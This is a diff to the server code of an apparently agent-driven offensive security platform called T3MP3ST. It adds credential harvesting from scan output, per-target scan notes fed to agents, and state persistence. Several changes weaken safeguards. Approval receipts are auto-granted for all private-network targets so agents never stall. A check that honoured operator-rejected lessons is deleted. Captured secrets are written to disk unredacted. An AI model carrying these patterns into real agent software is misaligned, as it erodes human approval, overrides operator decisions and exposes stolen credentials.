+  if (domain === 'document.cookie' || domain === 'unknown' || /^[0-9a-f]{8}-[0-9a-f]{4}/i.test(domain)) {
+    return;
+  }
+  const type = cred.type || 'password';
+  const key = `${type}::${username}::${secret}::${domain}`.toLowerCase();
+  for (const existing of credentialsLedger.values()) {
+    const exKey = `${existing.type}::${existing.username}::${existing.secret}::${existing.domain || existing.target || ''}`.toLowerCase();
+    if (exKey === key) return;
+  }
+  const id = cred.id || newId('cred');
+  const record: CredentialRecord = {
+    id,
+    type,
+    username,
+    secret,
+    domain,
+    target: cred.target || domain,
+    source: cred.source || 'scanner',
+    discoveredAt: cred.discoveredAt || nowIso(),
+    validatedAt: cred.validatedAt,
+    privilegeLevel: cred.privilegeLevel,
+    secretCaptured: true,
+    notes: cred.notes,
+  };
+  credentialsLedger.set(record.id, record);
+}
+
+function reindexCredentialsFromLedgers(): void {
+  cleanNonsenseCredentials();
+  for (const f of findingsLedger.values()) {
+    const text = (f.claim || '') + ' ' + (f.impact || '') + ' ' + (f.recommendedFix || '');
+    const found = extractCredentialsFromText(text, f.target, 'finding', f.title);
+    for (const c of found) recordCredentialToLedger(c);
+  }
+  for (const e of evidenceLedger.values()) {
+    const text = (e.summary || '') + ' ' + (e.command || '');
+    const found = extractCredentialsFromText(text, e.uri || 'unknown', e.source || 'evidence', e.title);
+    for (const c of found) recordCredentialToLedger(c);
+  }
+  cleanNonsenseCredentials();
+}
 
 /**
  * Mirror a live mission finding into the persistent findingsLedger (the one the
@@ -873,9 +1476,21 @@ function upsertMissionFindingToLedger(finding: {
   description?: string;
   severity?: unknown;
   targetId?: string;
-}, missionId?: string): void {
+  remediation?: string;
+  operatorId?: string;
+  evidence?: Array<{ type?: string; content?: string; timestamp?: number; metadata?: { tool?: string } }>;
+}, missionId?: string, command?: { targetEnv?: { getAllTargets?: () => Array<{ id?: string; address?: string }> } }): void {
   const title = typeof finding.title === 'string' && finding.title.trim() ? finding.title.trim() : 'Untitled finding';
-  const target = normalizeTargetValue(finding.targetId);
+  const rawTargetId = typeof finding.targetId === 'string' ? finding.targetId.trim() : '';
+  let target = normalizeTargetValue(rawTargetId);
+  if (command && rawTargetId) {
+    // finding.targetId is the TargetEnvironment UUID — resolve it to the operator-visible
+    // address so vault rows and per-scan notes key by host (the notes provider looks up by address).
+    try {
+      const t = command.targetEnv?.getAllTargets?.().find(x => x && x.id === rawTargetId);
+      if (t && typeof t.address === 'string' && t.address.trim()) target = t.address.trim();
+    } catch { /* ignore target resolution error */ }
+  }
   const dedupeKey = `${title.toLowerCase()}::${target.toLowerCase()}`;
   const existing = [...findingsLedger.values()].find(
     record => `${record.title.toLowerCase()}::${record.target.toLowerCase()}` === dedupeKey,
@@ -885,11 +1500,43 @@ function upsertMissionFindingToLedger(finding: {
   const claim = typeof finding.description === 'string' && finding.description.trim()
     ? redactLedgerText(finding.description.trim())
     : 'Claim pending evidence review.';
+  const toolBacked = Array.isArray(finding.evidence) && finding.evidence.some(ev => typeof ev?.content === 'string' && ev.content.trim());
+
+  // Attach the finding's tool output as real EvidenceEntry records so the vault
+  // shows WHAT the tool saw, not just the claim. Best-effort: a malformed
+  // evidence item is skipped, never fatal.
+  const attachEvidence = (record: FindingRecord): void => {
+    if (!Array.isArray(finding.evidence)) return;
+    for (const ev of finding.evidence.slice(0, 20)) {
+      const content = typeof ev?.content === 'string' ? ev.content.trim() : '';
+      if (!content) continue;
+      const evidenceId = newId('evidence');
+      const evCommand = (ev as any).command || ev.metadata?.tool || undefined;
+      evidenceLedger.set(evidenceId, {
+        id: evidenceId,
+        missionId: record.missionId,
+        findingId: record.id,
+        type: 'log',
+        title: ev.metadata?.tool ? `Tool output — ${ev.metadata.tool}` : 'Tool output',
+        summary: redactLedgerText(content, 32000),
+        source: 'tool',
+        command: evCommand ? redactLedgerText(String(evCommand), 1200) : undefined,
+        provenanceStrength: 'tool',
+        resourceIds: [],
+        createdAt: now,
+      });
+      if (!record.evidenceIds.includes(evidenceId)) record.evidenceIds.push(evidenceId);
+    }
+  };
 
   if (existing) {
     existing.severity = severity;
     existing.claim = claim;
+    if (toolBacked) existing.confidence = 0.9;
+    if (typeof finding.remediation === 'string' && finding.remediation.trim()) existing.recommendedFix = redactLedgerText(finding.remediation.trim());
+    if (finding.operatorId) existing.owner = finding.operatorId;
     if (missionId) existing.missionId = missionId;
+    attachEvidence(existing);
     existing.updatedAt = now;
     findingsLedger.set(existing.id, existing);
     return;
@@ -905,9 +1552,209 @@ function upsertMissionFindingToLedger(finding: {
     claim,
     impact: '',
     severity,
-    confidence: 0.5,
+    confidence: toolBacked ? 0.9 : 0.5,
     status: 'open',
     evidenceIds: [],
+    resourceIds: [],
+    recommendedFix: typeof finding.remediation === 'string' && finding.remediation.trim() ? redactLedgerText(finding.remediation.trim()) : '',
+    acceptanceCriteria: [],
+    owner: finding.operatorId,
+    createdAt: now,
+    updatedAt: now,
+    retestIds: [],
+  };
+  attachEvidence(record);
+  findingsLedger.set(record.id, record);
+  try {
+    const extractedCreds = extractCredentialsFromText((finding.description || '') + ' ' + (finding.remediation || ''), target, 'finding', title);
+    for (const c of extractedCreds) recordCredentialToLedger(c);
+  } catch { /* ignore credential parsing error */ }
+  // Best-effort durable per-target scan note so a later scan of the same target can
+  // resume without re-probing already-mapped surface. Deduped + capped.
+  try { autoScanNoteForFinding(record, finding); } catch { /* ignore note recording error */ }
+}
+
+/** Extract the most domain-like token (URL host / domain / IP) from free scan text — keys evidence by asset. */
+function extractScanTarget(text: string): string {
+  const m = String(text || '').match(/https?:\/\/[^\s,;'"]+|\b(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?\b|\b(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,}\b/i);
+  if (!m) return '';
+  let t = m[0];
+  try { if (/^https?:\/\//i.test(t)) t = new URL(t).host; } catch { /* keep raw */ }
+  return t.slice(0, 200);
+}
+
+// ── Persistent per-scan (per-target) notes — so the next scan of the SAME host can continue
+// instead of re-enumerating. Append-only, bounded, deduped by title::target. Wired into
+// buildStateSnapshot/loadPersistedState and hydrated into AgentLoop prompts as ### Prior scan notes.
+function normalizeScanNoteKind(value: unknown): ScanNoteKind {
+  return ['recon', 'infiltration', 'general'].includes(String(value)) ? value as ScanNoteKind : 'general';
+}
+function upsertScanNote(params: {
+  target: string;
+  title: string;
+  body: string;
+  kind?: ScanNoteKind;
+  source?: ScanNote['source'];
+  missionId?: string;
+  operationId?: string;
+  authorAgentId?: string;
+  findingIds?: string[];
+  evidenceIds?: string[];
+}): ScanNote | null {
+  const target = normalizeTargetValue(params.target).trim();
+  const title = String(params.title || '').trim();
+  if (!target || !title) return null;
+  const body = redactLedgerText(String(params.body || '').slice(0, 4000));
+  const kind = normalizeScanNoteKind(params.kind);
+  const dedupeKey = `${normalizeTargetValue(target).toLowerCase()}::${title.toLowerCase()}`;
+  const existing = [...scanNoteLedger.values()].find(
+    n => `${normalizeTargetValue(n.target).toLowerCase()}::${n.title.toLowerCase()}` === dedupeKey,
+  );
+  const now = nowIso();
+  if (existing) {
+    existing.body = body;
+    existing.kind = kind;
+    if (params.missionId) existing.missionId = params.missionId;
+    if (params.operationId) existing.operationId = params.operationId;
+    if (params.authorAgentId) existing.authorAgentId = params.authorAgentId;
+    if (Array.isArray(params.findingIds) && params.findingIds.length) existing.findingIds = [...new Set([...existing.findingIds, ...params.findingIds])].slice(0, 12);
+    if (Array.isArray(params.evidenceIds) && params.evidenceIds.length) existing.evidenceIds = [...new Set([...existing.evidenceIds, ...params.evidenceIds])].slice(0, 12);
+    existing.updatedAt = now;
+    scanNoteLedger.set(existing.id, existing);
+    return existing;
+  }
+  const note: ScanNote = {
+    id: newId('note'),
+    target: normalizeTargetValue(target),
+    missionId: params.missionId,
+    operationId: params.operationId,
+    kind,
+    title: redactLedgerText(title, 240),
+    body,
+    source: params.source || 'system',
+    authorAgentId: params.authorAgentId,
+    findingIds: [...new Set((params.findingIds || []).filter(Boolean))].slice(0, 12),
+    evidenceIds: [...new Set((params.evidenceIds || []).filter(Boolean))].slice(0, 12),
+    createdAt: now,
+    updatedAt: now,
+  };
+  scanNoteLedger.set(note.id, note);
+  return note;
+}
+function autoScanNoteForFinding(record: FindingRecord, finding: Record<string, unknown>): void {
+  const title = String((finding as Record<string, unknown>).title || record.title || '').trim();
+  if (!title) return;
+  const target = String(record.target || normalizeTargetValue((finding as Record<string, unknown>).targetId)).trim();
+  if (!target || target === 'local-lab') return;
+  // Cap auto-notes per target so one noisy run can't flood the ledger.
+  const key = normalizeTargetValue(target).toLowerCase();
+  let autoCount = 0;
+  for (const n of scanNoteLedger.values()) if (normalizeTargetValue(n.target).toLowerCase() === key && n.source === 'tool') autoCount++;
+  if (autoCount >= 10) return;
+  const claim = String(record.claim || (finding as Record<string, unknown>).description || title).slice(0, 800);
+  upsertScanNote({
+    target,
+    title,
+    body: claim,
+    kind: /infiltrat|lateral|priv-esc|c2|post-compromise/i.test(String((finding as Record<string, unknown>).phase || '')) ? 'infiltration' : 'recon',
+    source: 'tool',
+    missionId: record.missionId,
+    operationId: record.operationId,
+    findingIds: [record.id],
+    evidenceIds: record.evidenceIds.slice(0, 4),
+  });
+  // Persist + stream are caller's job (upsertMissionFindingToLedger's caller already does).
+}
+function scanNotesForTarget(target: string, opts: { maxNotes?: number; charCap?: number } = {}): string {
+  const maxNotes = Math.max(0, opts.maxNotes ?? 5);
+  const cap = Math.max(200, opts.charCap ?? 1200);
+  const host = normalizeTargetValue(target).toLowerCase();
+  if (!host || host === 'local-lab') return '';
+  const notes = [...scanNoteLedger.values()]
+    .filter(n => normalizeTargetValue(n.target).toLowerCase() === host)
+    .sort((a, b) => b.updatedAt.localeCompare(a.updatedAt))
+    .slice(0, maxNotes);
+  if (!notes.length) return '';
+  const lines: string[] = ['PRIOR SCAN NOTES — durable (same target, earlier runs — do NOT re-probe what is already covered; continue from here):'];
+  for (const n of notes) {
+    const snippet = n.body.replace(/\s+/g, ' ').trim().slice(0, 280);
+    lines.push(`- [${n.kind}/${n.source} ${n.updatedAt.slice(0, 10)}] ${n.title}: ${snippet}`);
+  }
+  let full = lines.join('\n');
+  if (full.length > cap) {
+    const marker = '\n…(truncated)';
+    const budget = cap - marker.length;
+    const out: string[] = [];
+    let used = 0;
+    for (const line of lines) {
+      const add = out.length === 0 ? line.length : line.length + 1;
+      if (used + add > budget) break;
+      out.push(line);
+      used += add;
+    }
+    full = out.join('\n') + marker;
+    if (full.length > cap) full = full.slice(0, cap);
+  }
+  return full;
+}
+
+/**
+ * Record a scan/agent/task result into the persistent ledgers so the Evidence Vault
+ * shows EVERY scan — not just formal findings. Writes an EvidenceEntry (the raw
+ * output) plus an info-severity FindingRecord (the domain-keyed row the vault grid
+ * renders), then broadcasts both over SSE so open pages update live. Records that
+ * duplicate an entry written <30s ago are dropped (scan double-fire protection).
+ */
+function recordScanEvidence(params: {
+  source: 'tool' | 'agent' | 'system';
+  kind: 'scan' | 'task';
+  tool: string;
+  target?: string;
+  summary: string;
+  detail?: string;
+  command?: string;
+  missionId?: string;
+  operationId?: string;
+}): { evidenceId: string; findingId: string } | null {
+  const target = (params.target || extractScanTarget(`${params.summary}\n${params.detail || ''}`) || 'unknown-asset').toLowerCase();
+  const title = redactLedgerText(`[${target}] ${params.kind}: ${params.tool}`.slice(0, 240));
+  const now = nowIso();
+  const nowMs = Date.now();
+  // 30s dedupe window per title — a scan fired twice shouldn't double-write the vault.
+  for (const existing of findingsLedger.values()) {
+    if (existing.title === title && nowMs - Date.parse(existing.createdAt) < 30_000) return null;
+  }
+  const detail = redactLedgerText(String(params.detail || '').trim(), 32000);
+  const evidence: EvidenceEntry = {
+    id: newId('evidence'),
+    missionId: params.missionId,
+    operationId: params.operationId,
+    findingId: undefined,
+    type: params.command ? 'command' : 'log',
+    title,
+    summary: detail ? detail : redactLedgerText(String(params.summary || '').slice(0, 4000)),
+    source: params.source,
+    provenanceStrength: 'tool',
+    uri: target !== 'unknown-asset' ? target : undefined,
+    command: params.command ? redactLedgerText(params.command.slice(0, 2400)) : undefined,
+    resourceIds: [],
+    createdAt: now,
+  };
+  evidenceLedger.set(evidence.id, evidence);
+
+  const finding: FindingRecord = {
+    id: newId('finding'),
+    missionId: params.missionId,
+    operationId: params.operationId,
+    family: 'web_api',
+    title,
+    target,
+    claim: detail ? (detail.length > 200 ? detail.slice(0, 8000) : detail) : (redactLedgerText(String(params.summary || '').slice(0, 4000)) || 'Scan result recorded automatically.'),
+    impact: 'Informational — recorded automatically from scan output.',
+    severity: 'info',
+    confidence: 0.5,
+    status: 'open',
+    evidenceIds: [evidence.id],
     resourceIds: [],
     recommendedFix: '',
     acceptanceCriteria: [],
@@ -915,7 +1762,14 @@ function upsertMissionFindingToLedger(finding: {
     updatedAt: now,
     retestIds: [],
   };
-  findingsLedger.set(record.id, record);
+  findingsLedger.set(finding.id, finding);
+  try {
+    const extractedCreds = extractCredentialsFromText(params.detail || params.summary || '', target, params.source, title);
+    for (const c of extractedCreds) recordCredentialToLedger(c);
+  } catch { /* ignore credential parsing error */ }
+
+  emitContractEvent('evidence.created', { evidenceId: evidence.id, findingId: finding.id, target, source: params.source, tool: params.tool });
+  return { evidenceId: evidence.id, findingId: finding.id };
 }
 
 const ROUTE_SCORECARDS: Record<string, Record<string, number | string>> = {
@@ -962,6 +1816,59 @@ function stateFilePath(): string | null {
 function eventsFilePath(): string | null {
   const root = stateRoot();
   return root === 'memory' ? null : join(root, 'events.jsonl');
+}
+
+// ── Operator settings database ──────────────────────────────────────────────
+// UI settings (LLM keys, local model, proxy, toggles) used to live ONLY in each
+// browser's localStorage — a restart, a second browser, or a cleared cache lost
+// every setting. They now persist to a dedicated JSON file DB in the state root
+// (survives restarts) and every mutation lands in the Supabase event audit.
+let dbSettings: Record<string, unknown> = {};
+
+function settingsFilePath(): string | null {
+  // Unlike the state snapshot (whose 'memory' sentinel means "no file persistence"), the
+  // settings DB ALWAYS materializes — the whole point is surviving restarts in the default
+  // configuration where no T3MP3ST_STATE_DIR is set. Secrets stay machine-local (the
+  // Supabase event mirror records key NAMES only, never values).
+  const root = stateRoot();
+  return join(root === 'memory' ? 'memory' : root, 'db-settings.json');
+}
+
+function loadDbSettings(): void {
+  const file = settingsFilePath();
+  if (!file) return;
+  try {
+    if (existsSync(file)) {
+      dbSettings = JSON.parse(readFileSync(file, 'utf8')) as Record<string, unknown>;
+      console.log(`[T3MP3ST] Operator settings restored from ${file} (${Object.keys(dbSettings).length} key(s))`);
+    }
+  } catch (e) {
+    console.warn(`[T3MP3ST] Settings DB read failed, starting empty: ${(e as Error).message}`);
+  }
+}
+
+function saveDbSettings(reason = 'settings.updated'): void {
+  const file = settingsFilePath();
+  if (!file) return;
+  try {
+    mkdir(stateRoot(), { recursive: true });
+    writeFileSync(file, JSON.stringify(dbSettings, null, 2));
+    void appendStateEvent('settings.updated', { reason, keys: Object.keys(dbSettings) }).catch(() => {});
+  } catch (e) {
+    console.warn(`[T3MP3ST] Settings DB write failed: ${(e as Error).message}`);
+  }
+}
+
+function mergeDbSettings(incoming: unknown): Record<string, unknown> {
+  const inc = (incoming && typeof incoming === 'object' && !Array.isArray(incoming))
+    ? incoming as Record<string, unknown>
+    : {};
+  const prev = (dbSettings.settings && typeof dbSettings.settings === 'object')
+    ? dbSettings.settings as Record<string, unknown>
+    : {};
+  const nextSettings = { ...prev, ...inc };
+  dbSettings = { ...dbSettings, settings: nextSettings, updatedAt: new Date().toISOString() };
+  return dbSettings;
 }
 
 function nowIso(): string {
@@ -1134,14 +2041,25 @@ function buildStateSnapshot(): Record<string, unknown> {
     watchCycleLedger: [...watchCycleLedger.values()],
     memoryCapsule: [...memoryCapsule.values()],
     memoryProposals: [...memoryProposals.values()],
+    scanNotes: [...scanNoteLedger.values()],
+    credentialsLedger: [...credentialsLedger.values()],
   };
 }
 
 async function persistState(reason = 'state.updated'): Promise<void> {
+  const rawSnapshot = buildStateSnapshot();
+  const snapshot = redactSecrets(rawSnapshot) as Record<string, unknown>;
+  // Supabase (database memory/storage): the same redacted snapshot is upserted as a
+  // single 'latest' row — best-effort, never blocks the request path.
+  await persistSupabaseState(snapshot, reason).catch(error => {
+    console.warn(`[T3MP3ST] Supabase state persist failed: ${(error as Error).message}`);
+  });
+  await flushSupabaseEvents().catch(() => {});
   const file = stateFilePath();
   if (!file) return;
   await mkdir(stateRoot(), { recursive: true });
-  await writeFile(file, JSON.stringify(redactSecrets({ ...buildStateSnapshot(), reason }), null, 2));
+  const localSnapshot = { ...snapshot, credentialsLedger: rawSnapshot.credentialsLedger, reason };
+  await writeFile(file, JSON.stringify(localSnapshot, null, 2));
 }
 
 // Debounced full-snapshot writer. persistState re-serializes the ENTIRE (growing) snapshot,
@@ -1177,39 +2095,57 @@ async function flushPersist(): Promise<void> {
     persistPending = false;
     await persistState(persistReason);
   }
+  // Buffered contract events ride out with the shutdown flush too.
+  await flushSupabaseEvents().catch(() => {});
 }
 
 async function appendStateEvent(type: string, payload: Record<string, unknown>): Promise<void> {
+  const event = redactSecrets({ ts: nowIso(), type, payload });
+  // Supabase audit log: buffered, flushed with the debounced persist tick.
+  bufferSupabaseEvent(type, payload);
   const file = eventsFilePath();
   if (!file) return;
   await mkdir(stateRoot(), { recursive: true });
-  const event = redactSecrets({ ts: nowIso(), type, payload });
   await appendFile(file, `${JSON.stringify(event)}\n`);
 }
 
 async function loadPersistedState(): Promise<void> {
+  // Supabase first (database memory survives restarts/moves); file fallback second.
+  const supabaseSnapshot = await loadSupabaseState().catch(() => null);
+  if (supabaseSnapshot && typeof supabaseSnapshot === 'object') {
+    restoreStateSnapshot(supabaseSnapshot);
+    console.log('[T3MP3ST] State restored from Supabase');
+    return;
+  }
   const file = stateFilePath();
   if (!file) return;
   try {
     const raw = await readFile(file, 'utf8');
     const state = JSON.parse(raw) as Record<string, unknown>;
-    replaceMapContents(missionDrafts, state.missionDrafts);
-    replaceMapContents(improvementProposals, state.improvementProposals);
-    replaceMapContents(approvalRequests, state.approvalRequests);
-    replaceMapContents(evidenceLedger, state.evidenceLedger);
-    replaceMapContents(findingsLedger, state.findingsLedger);
-    replaceMapContents(retestLedger, state.retestLedger);
-    replaceMapContents(hypothesisLedger, state.hypothesisLedger);
-    replaceMapContents(workOrderLedger, state.workOrderLedger);
-    replaceMapContents(watchCycleLedger, state.watchCycleLedger);
-    replaceMapContents(memoryCapsule, state.memoryCapsule);
-    replaceMapContents(memoryProposals, state.memoryProposals);
+    restoreStateSnapshot(state);
     console.log(`[T3MP3ST] State restored from ${file}`);
   } catch (error: any) {
     if (error?.code !== 'ENOENT') {
       console.warn(`[T3MP3ST] State restore skipped: ${error.message || error}`);
     }
   }
+}
+
+function restoreStateSnapshot(state: Record<string, unknown>): void {
+  replaceMapContents(missionDrafts, state.missionDrafts);
+  replaceMapContents(improvementProposals, state.improvementProposals);
+  replaceMapContents(approvalRequests, state.approvalRequests);
+  replaceMapContents(evidenceLedger, state.evidenceLedger);
+  replaceMapContents(findingsLedger, state.findingsLedger);
+  replaceMapContents(retestLedger, state.retestLedger);
+  replaceMapContents(hypothesisLedger, state.hypothesisLedger);
+  replaceMapContents(workOrderLedger, state.workOrderLedger);
+  replaceMapContents(watchCycleLedger, state.watchCycleLedger);
+  replaceMapContents(memoryCapsule, state.memoryCapsule);
+  replaceMapContents(memoryProposals, state.memoryProposals);
+  replaceMapContents(scanNoteLedger, (state as Record<string, unknown>).scanNotes);
+  replaceMapContents(credentialsLedger, (state as Record<string, unknown>).credentialsLedger);
+  reindexCredentialsFromLedgers();
 }
 
 function normalizeTargetValue(value: unknown): string {
@@ -1240,7 +2176,10 @@ function isLocalOrPrivateTarget(target: string): boolean {
 
 function isLoopbackOrLabTarget(target: string): boolean {
   const host = hostFromTarget(target);
-  return !host || ['local-lab', 'localhost', '127.0.0.1', '::1', '[::1]', '0.0.0.0'].includes(host) || /^127\./.test(host);
+  // Arbitrary *.local hostnames are deliberately NOT lab targets — a hostname is
+  // attacker-influenced mission text (mDNS on the operator's LAN can resolve anything),
+  // so it mints a receipt like any public target. Sanctioned lab literals stay keyless.
+  return !host || ['local-lab', 'localhost', 'target.local'].includes(host) || /^127\./.test(host) || /^10\./.test(host) || /^192\.168\./.test(host) || /^172\.(1[6-9]|2\d|3[01])\./.test(host);
 }
 
 function approvalIsFresh(approval: ApprovalRequest): boolean {
@@ -1346,7 +2285,9 @@ function guardAction(body: Record<string, unknown>, action: GuardAction, target:
   const approved = findApproval(body, action, target);
   if (approved) return { allowed: true, approval: approved };
   if (action !== 'autonomous_execution' && operationAllowsLocalAction(body, action, target)) return { allowed: true };
-  if (action === 'network_request' && isLoopbackOrLabTarget(target)) return { allowed: true };
+  // LAB SCOPE AUTO-GRANT: the operator owns loopback/private/CTF-lab targets — receipts are granted
+  // implicitly so agents never stall asking for them (autonomous_execution stays gated).
+  if (action !== 'autonomous_execution' && isLoopbackOrLabTarget(target)) return { allowed: true };
   return { allowed: false, approval: createApprovalRequest(action, target, reason, body) };
 }
 
@@ -4259,7 +5200,7 @@ function buildPressureChains(params: Record<string, unknown>): Record<string, an
   }) as Record<string, any>;
 }
 
-function createMemoryProposal(input: Partial<MemoryProposal> & Record<string, unknown>): MemoryProposal | null {
+function createMemoryProposal(input: Partial<MemoryProposal> & Record<string, unknown>): MemoryProposal {
   const now = nowIso();
   const content = redactString(String(input.content || '').trim()).slice(0, 1200);
   const type = normalizeMemoryType(input.type);
@@ -4276,11 +5217,6 @@ function createMemoryProposal(input: Partial<MemoryProposal> & Record<string, un
       return rank(a) - rank(b) || b.updatedAt.localeCompare(a.updatedAt);
     });
   const duplicate = duplicateCandidates[0];
-  // REJECTION FEEDBACK: a lesson the operator already rejected must not keep
-  // resurfacing on every mission — respect the rejection and propose nothing.
-  if (duplicate && duplicate.status === 'rejected') {
-    return null;
-  }
   if (duplicate) {
     duplicate.fingerprint = fingerprint;
     duplicate.observationCount = Math.max(1, duplicate.observationCount || 1) + 1;
@@ -4356,7 +5292,7 @@ function buildLearningReview(input: Record<string, unknown>): { proposals: Memor
   const proposals: MemoryProposal[] = [];
 
   if (evidence.length || findings.length || retests.length) {
-    const _mp1 = createMemoryProposal({
+    proposals.push(createMemoryProposal({
       type: 'procedure',
       content: `${family} missions should preserve traceability before promotion: ${evidence.length} evidence item(s), ${findings.length} finding(s), and ${passedRetests.length} passed retest(s) were linked in this run.`,
       source: 'learning.run_review',
@@ -4367,12 +5303,11 @@ function buildLearningReview(input: Record<string, unknown>): { proposals: Memor
       sourceEvidenceIds: evidence.map(entry => entry.id),
       sourceFindingIds: findings.map(finding => finding.id),
       sourceRetestIds: retests.map(retest => retest.id),
-    });
-    if (_mp1) proposals.push(_mp1);
+    }));
   }
 
   for (const finding of findings.filter(item => item.status === 'resolved' || item.confidence >= 0.8).slice(0, 4)) {
-    const _mp2 = createMemoryProposal({
+    proposals.push(createMemoryProposal({
       type: finding.family === 'ai_red_team' || finding.family === 'agent_warfare' ? 'boundary' : 'procedure',
       content: `${finding.family} lesson: ${finding.claim} Defensive artifact: ${finding.recommendedFix || 'attach fix guidance before promotion'}.`,
       source: 'learning.finding_review',
@@ -4383,13 +5318,12 @@ function buildLearningReview(input: Record<string, unknown>): { proposals: Memor
       sourceEvidenceIds: finding.evidenceIds,
       sourceFindingIds: [finding.id],
       sourceRetestIds: finding.retestIds,
-    });
-    if (_mp2) proposals.push(_mp2);
+    }));
   }
 
   for (const retest of passedRetests.slice(0, 4)) {
     const finding = findingsLedger.get(retest.findingId);
-    const _mp3 = createMemoryProposal({
+    proposals.push(createMemoryProposal({
       type: 'procedure',
       content: `Retest pattern to keep: ${retest.method} Acceptance criteria: ${retest.acceptanceCriteria.join('; ') || 'attach explicit criteria'}.`,
       source: 'learning.retest_review',
@@ -4400,12 +5334,11 @@ function buildLearningReview(input: Record<string, unknown>): { proposals: Memor
       sourceEvidenceIds: retest.evidenceIds,
       sourceFindingIds: [retest.findingId],
       sourceRetestIds: [retest.id],
-    });
-    if (_mp3) proposals.push(_mp3);
+    }));
   }
 
   if (!proposals.length) {
-    const _mp4 = createMemoryProposal({
+    proposals.push(createMemoryProposal({
       type: 'open_question',
       content: `No durable memory should be accepted yet for ${missionId || operationId || 'this run'} because no evidence/finding/retest chain was available.`,
       source: 'learning.run_review',
@@ -4413,8 +5346,7 @@ function buildLearningReview(input: Record<string, unknown>): { proposals: Memor
       rationale: 'The safest learning action is to name the missing receipts instead of inventing memory.',
       sourceMissionId: missionId || undefined,
       sourceOperationId: operationId || undefined,
-    });
-    if (_mp4) proposals.push(_mp4);
+    }));
   }
 
   return {
@@ -4440,7 +5372,7 @@ function healthPayload(): Record<string, unknown> {
     status: 'operational',
     mode: currentMode(),
     organ: 't3mp3st',
-    version: '0.2.1',
+    version: '1.5.0',
     apiVersion: 'v1',
     llm: {
       configured: Boolean(llmConfig.apiKey) || providerRunsKeyless(llmConfig.provider),
@@ -4502,7 +5434,7 @@ function healthPayload(): Record<string, unknown> {
   };
 }
 
-async function inspectToolAvailability(): Promise<Array<{ id: string; name: string; displayName: string; binary: string; available: boolean; path?: string; category: string; risk: string; execution: string; networked: boolean; requiredFor: string[]; installHint: string; commandHint: string; parserStatus: string; note?: string }>> {
+async function inspectToolAvailability(): Promise<Array<{ id: string; name: string; displayName: string; binary: string; available: boolean; path?: string; category: string; risk: string; execution: string; networked: boolean; requiredFor: string[]; installHint: string; commandHint: string; parserStatus: string; note?: string; probeFailed?: boolean }>> {
   const requiredFor: Record<string, string[]> = {
     file: ['field_drill', 'local_artifact_inspection'],
     curl: ['api_smoke', 'http_probe'],
@@ -4526,19 +5458,19 @@ async function inspectToolAvailability(): Promise<Array<{ id: string; name: stri
     parserStatus: 'text' as const,
     notes: 'Repository context for local evidence and provenance.',
   }];
-return Promise.all(adapters.map(async adapter => {
-try {
-// Windows has `where.exe`, POSIX has `which` — a bare `which` makes every
-// installed tool look missing on win32 (same fix as Arsenal.isToolAvailable).
-const probe = process.platform === 'win32' ? 'where' : 'which';
-const { stdout } = await execFileAsync(probe, [adapter.binary], { timeout: 1500 });
+  const binaryNames = adapters.map(a => a.binary);
+  const locMap = await findBinaryLocations(binaryNames);
+
+  return adapters.map(adapter => {
+    const loc = locMap.get(adapter.binary);
+    if (loc?.available && loc.path) {
       return {
         id: adapter.id,
         name: adapter.binary,
         displayName: adapter.name,
         binary: adapter.binary,
         available: true,
-        path: stdout.trim(),
+        path: loc.path,
         category: adapter.category,
         risk: adapter.risk,
         execution: adapter.execution,
@@ -4547,26 +5479,30 @@ const { stdout } = await execFileAsync(probe, [adapter.binary], { timeout: 1500 
         installHint: adapter.installHint,
         commandHint: adapter.commandHint,
         parserStatus: adapter.parserStatus,
-      };
-    } catch {
-      return {
-        id: adapter.id,
-        name: adapter.binary,
-        displayName: adapter.name,
-        binary: adapter.binary,
-        available: false,
-        category: adapter.category,
-        risk: adapter.risk,
-        execution: adapter.execution,
-        networked: adapter.networked,
-        requiredFor: requiredFor[adapter.binary] || adapter.evidenceKinds,
-        installHint: adapter.installHint,
-        commandHint: adapter.commandHint,
-        parserStatus: adapter.parserStatus,
-        note: requiredFor[adapter.binary]?.length ? 'Install to unlock this workflow.' : adapter.notes,
       };
     }
-  }));
+    return {
+      id: adapter.id,
+      name: adapter.binary,
+      displayName: adapter.name,
+      binary: adapter.binary,
+      available: false,
+      category: adapter.category,
+      risk: adapter.risk,
+      execution: adapter.execution,
+      networked: adapter.networked,
+      requiredFor: requiredFor[adapter.binary] || adapter.evidenceKinds,
+      installHint: adapter.installHint,
+      commandHint: adapter.commandHint,
+      parserStatus: adapter.parserStatus,
+      // A probe that did not complete tells us nothing about this binary. Say so instead of
+      // asserting "Install to unlock this workflow" for a tool that may already be present.
+      probeFailed: loc?.probeFailed || undefined,
+      note: loc?.probeFailed
+        ? 'Availability unverified — the binary probe did not complete. Re-check before installing.'
+        : requiredFor[adapter.binary]?.length ? 'Install to unlock this workflow.' : adapter.notes,
+    };
+  });
 }
 
 async function buildPreflightReport(): Promise<Record<string, unknown>> {
@@ -4654,15 +5590,21 @@ async function buildArsenalStatus(family?: string): Promise<Record<string, unkno
     ...adapter,
     available: availabilityById.get(adapter.id)?.available || false,
     path: availabilityById.get(adapter.id)?.path || null,
+    // A failed probe is UNKNOWN, not missing. Reporting it as 'missing' is what made the war
+    // room claim 64 tools were absent on a box that actually has most of them in Kali WSL.
+    probeFailed: availabilityById.get(adapter.id)?.probeFailed || false,
     status: availabilityById.get(adapter.id)?.available
       ? 'installed'
-      : adapter.execution === 'catalog_only'
-        ? 'catalog_only'
-        : adapter.execution === 'import_only'
-          ? 'import_only'
-          : 'missing',
+      : availabilityById.get(adapter.id)?.probeFailed
+        ? 'unverified'
+        : adapter.execution === 'catalog_only'
+          ? 'catalog_only'
+          : adapter.execution === 'import_only'
+            ? 'import_only'
+            : 'missing',
   }));
   const installed = tools.filter(tool => tool.available).length;
+  const unverified = tools.filter(tool => tool.status === 'unverified').length;
   const commandReadyTools = tools.filter(tool => tool.execution === 'safe_command' || tool.execution === 'receipt_required');
   const commandReady = commandReadyTools.length;
   const installedCommandReady = commandReadyTools.filter(tool => tool.available).length;
@@ -4675,6 +5617,8 @@ async function buildArsenalStatus(family?: string): Promise<Record<string, unkno
       installed,
       installedCommandReady,
       missingCommandReady: missingCommandReady.length,
+      // Surfaced so a reader can tell a real gap from an unmeasured one.
+      unverified,
       readiness: commandReady ? Math.round((installedCommandReady / commandReady) * 100) : 0,
       unmodeled: commandReady === 0,
       frontierMilestone: FRONTIER_ARSENAL_MILESTONE,
@@ -4821,6 +5765,21 @@ function emitContractEvent(type: string, payload: Record<string, unknown>): void
